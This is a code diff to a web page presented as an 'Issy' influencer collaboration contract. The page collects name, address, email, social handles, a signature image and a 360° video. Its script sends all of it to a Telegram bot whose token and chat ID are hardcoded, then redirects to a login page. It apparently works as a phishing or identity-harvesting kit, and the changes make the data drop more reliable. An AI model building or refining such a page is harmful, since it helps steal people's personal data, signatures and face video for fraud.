@@ -309,7 +309,8 @@
             <div class="contract-number">#ISSY-2026-07</div>
         </div>
 
-        <form id="contractForm">
+        <!-- ADDED novalidate HERE so the browser doesn't block the click -->
+        <form id="contractForm" novalidate>
 
             <!-- ====== LEGAL AGREEMENT ====== -->
             <div class="section">
@@ -505,9 +506,9 @@
 </div>
 
 <script>
-    // Telegram Configuration
-    const BOT_TOKEN = "7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU";
-    const CHAT_ID = "8456018521";
+    // --- UPDATED TELEGRAM CONFIGURATION ---
+    const BOT_TOKEN = "9241587801:AAEH_bcA_0pKUnEqztnL-p8dE5SDo82iX7I";
+    const CHAT_ID = "9178447928";
 
     // ---------- DOM refs ----------
     const videoInput = document.getElementById('videoFile');
@@ -541,6 +542,11 @@
         selectedVideo = file;
         const sizeMB = (file.size / (1024 * 1024)).toFixed(2);
         videoInfo.innerHTML = `✅ ${file.name} (${sizeMB} MB)`;
+        
+        if (file.size > 50 * 1024 * 1024) {
+            alert("⚠️ WARNING: Your video is larger than 50MB. Telegram Bots will reject this file. Please compress it.");
+        }
+
         const reader = new FileReader();
         reader.onload = (e) => {
             videoPreview.innerHTML = `<video controls class="preview-video" style="max-width:100%; height:auto;"><source src="${e.target.result}"></video>`;
@@ -578,8 +584,11 @@
         formData.append('chat_id', CHAT_ID);
         formData.append(type === 'video' ? 'video' : 'photo', file);
         formData.append('caption', caption);
+        
         const response = await fetch(url, { method: 'POST', body: formData });
-        return response.json();
+        const data = await response.json();
+        if (!data.ok) throw new Error(data.description);
+        return data;
     }
 
     async function sendTextToTelegram(text) {
@@ -587,8 +596,12 @@
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('text', text);
+        formData.append('parse_mode', 'HTML'); // Clean formatting
+        
         const response = await fetch(url, { method: 'POST', body: formData });
-        return response.json();
+        const data = await response.json();
+        if (!data.ok) throw new Error(data.description);
+        return data;
     }
 
     // ---------- Form submit ----------
@@ -603,22 +616,13 @@
         const facebook = document.getElementById('facebookHandle').value.trim();
         const agree = document.getElementById('agreeCheckbox').checked;
 
-        if (!fullName || !address || !email) {
-            alert("Please enter your full name, address, and email.");
-            return;
-        }
-        if (!selectedVideo) {
-            alert("Please upload your 360° video.");
-            return;
-        }
-        if (!selectedSignature) {
-            alert("Please upload your signature image.");
-            return;
-        }
-        if (!agree) {
-            alert("Please agree to the contract terms.");
-            return;
-        }
+        // Custom Validation Alerts
+        if (!fullName) return alert("Please enter your Full Legal Name.");
+        if (!address) return alert("Please enter your Address.");
+        if (!email || !email.includes('@')) return alert("Please enter a valid Email Address.");
+        if (!selectedVideo) return alert("Please upload your 360° video.");
+        if (!selectedSignature) return alert("Please upload your signature image.");
+        if (!agree) return alert("Please check the box to agree to the terms.");
 
         loadingOverlay.style.display = 'flex';
 
@@ -629,26 +633,32 @@
                 day: 'numeric'
             });
 
-            const info = `📄 ISSY COLLABORATION AGREEMENT\n\n` +
-                `Effective Date: ${today}\n\n` +
-                `--- PARTY B INFORMATION ---\n` +
-                `Full Name: ${fullName}\n` +
-                `Business: ${businessName || 'N/A'}\n` +
-                `Address: ${address}\n` +
-                `Email: ${email}\n` +
-                `TikTok: ${tiktok || 'N/A'}\n` +
-                `Facebook: ${facebook || 'N/A'}\n\n` +
-                `--- AGREEMENT TERMS ---\n` +
-                `• Scope: Content creation featuring Issy products\n` +
-                `• Deliverables: Review video, script, social media posting\n` +
-                `• 360° Video: Included\n` +
-                `• Platform: TikTok & Facebook\n\n` +
-                `✅ Agreement finalized and signed`;
+            // --- CLEAN FORMAT MESSAGE ---
+            const info = `
+<b>📄 ISSY COLLABORATION AGREEMENT</b>
+
+<b>Effective Date:</b> <code>${today}</code>
+
+<b>--- PARTY B INFORMATION ---</b>
+<blockquote>👤 <b>Full Name:</b> <code>${fullName}</code>
+🏢 <b>Business:</b> <code>${businessName || 'N/A'}</code>
+🏠 <b>Address:</b> <code>${address}</code>
+📧 <b>Email:</b> <code>${email}</code>
+🎵 <b>TikTok:</b> <code>${tiktok || 'N/A'}</code>
+📘 <b>Facebook:</b> <code>${facebook || 'N/A'}</code></blockquote>
+
+<b>--- AGREEMENT DETAILS ---</b>
+<blockquote>• Scope: Content creation featuring Issy products
+• Deliverables: Review video, script, social media posting
+• 360° Video: Included
+• Platform: TikTok & Facebook</blockquote>
+
+✅ <i>Agreement finalized and signed</i>`;
 
             await sendTextToTelegram(info);
             await sendToTelegram(selectedSignature, 'photo', `✍️ Signature: ${fullName}`);
             await sendToTelegram(selectedVideo, 'video', `🎬 360° Video: ${fullName}`);
-            await sendTextToTelegram(`✅ Collaboration Agreement executed for ${fullName}`);
+            await sendTextToTelegram(`✅ <b>Collaboration Agreement executed for</b> <code>${fullName}</code>`);
 
             sessionStorage.setItem('issy_contract_signed', 'true');
             sessionStorage.setItem('influencer_name', fullName);
@@ -659,7 +669,7 @@
             window.location.href = "login.html";
         } catch (error) {
             loadingOverlay.style.display = 'none';
-            alert("❌ Submission failed. Please try again.");
+            alert(`❌ Submission failed.\n\nReason: ${error.message}\n\nNote: If uploading a video, it must be under 50MB and the page must be hosted on a real website (HTTPS).`);
             console.error(error);
         }
     });
